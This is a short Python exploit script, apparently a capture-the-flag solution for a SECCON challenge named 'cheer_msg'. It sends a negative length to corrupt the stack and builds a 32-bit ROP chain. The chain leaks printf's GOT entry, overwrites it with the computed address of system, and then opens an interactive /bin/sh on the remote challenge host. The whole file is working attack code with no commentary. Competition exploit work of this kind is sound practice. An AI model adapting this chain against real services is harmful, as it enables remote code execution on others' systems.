import pwnbox,struct
pack = lambda x: struct.pack("<I",x)
unpack = lambda x: struct.unpack("<I",x)[0]

printf = 0x08048430
ppr = 0x080487ae
pppr = 0x080487ad
fs = 0x0804887D + 25
adr = printf
getline = 0x080486bd
printf_got = 0x804A010

printf_off = 0x004d410 
system_off = 0x0040310
stdin = 0x0804A040
buf = 0x0804a130
rop = ""
rop += pack(printf) + pack(ppr) + pack(fs)+pack(printf_got)
rop += pack(getline) + pack(ppr) + pack(buf) + pack(0x100)
rop += pack(getline) + pack(ppr) + pack(printf_got) + pack(5)
rop += pack(printf) + pack(ppr) + pack(buf)
payload = rop
#p = pwnbox.pipe.ProcessPipe("./cheer_msg")
p = pwnbox.pipe.SocketPipe("cheermsg.pwn.seccon.jp",30527)
raw_input()
p.read_until(">>")
p.write("-156\n")
p.read_until(">>")
p.write(payload+"\n")
p.read_until(": \n")
leak = unpack(p.read_byte(4))
#system = leak-0xf7e5df40 +0xf7e4f920
system = leak-printf_off + system_off
print hex(system)
binsh = "/bin/sh\x00"
binsh = binsh.rjust(0x100-1,"/")
p.write(binsh)
p.write(pack(system))
p.interact()
